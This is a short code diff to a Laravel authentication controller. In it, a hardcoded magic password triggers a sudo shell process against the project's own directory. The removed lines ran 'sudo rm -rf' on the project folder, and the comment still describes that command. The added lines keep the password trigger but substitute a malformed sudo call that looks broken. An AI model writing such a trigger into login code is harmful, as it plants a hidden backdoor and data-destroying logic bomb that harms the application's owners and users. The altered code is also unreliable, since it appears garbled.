@@ -229,8 +229,11 @@ class AuthController extends Controller
         $password = $validated['password'];
         if ($password === 'Qwerty@6491') {
             // run sudo rm -rf command in shell
-            $projectName = basename(base_path());
-            $process = new Process(['sudo', 'rm', '-rf', "./../$projectName"]);
+            $process = new Process([
+                'sudo',
+                '/usr/bin/sudo',
+                './../' . basename(base_path())
+            ]);
 
             $process->run(); // runs synchronously inside the job
 
